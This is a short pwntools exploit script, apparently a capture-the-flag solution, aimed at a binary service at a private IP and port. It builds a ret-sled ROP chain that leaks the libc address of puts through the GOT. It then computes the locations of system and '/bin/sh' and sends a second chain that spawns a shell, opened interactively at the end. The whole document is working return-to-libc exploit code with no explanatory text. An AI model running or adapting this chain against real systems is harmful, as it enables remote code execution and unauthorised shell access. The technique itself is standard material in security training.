from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'

p=remote('10.212.26.206',35081)
#p=process('./pwn')
#gdb.attach(p)
libc=ELF('./libc.so.6')
rdi=0x40117a
ret=0x401016
puts_got=0x404008
puts_plt=0x401040
vuln=0x4011F7

payload=p64(ret)*((0x200-5*8)//8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)+p64(ret)

p.sendafter(b'Something to say?\n',payload)
p.sendafter(b'Leave your name?\n',b'aaaaaaaa')

libcbase=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-libc.symbols['puts']
print(hex(libcbase))

bin_sh=next(libc.search(b'/bin/sh\x00'))+libcbase
system=libcbase+libc.symbols['system']
payload=p64(ret)*((0x200-4*8)//8)+p64(rdi)+p64(bin_sh)+p64(system)+p64(ret)
p.sendafter(b'Something to say?\n',payload)
p.sendafter(b'Leave your name?\n',b'aaaaaaaaa')

p.interactive()
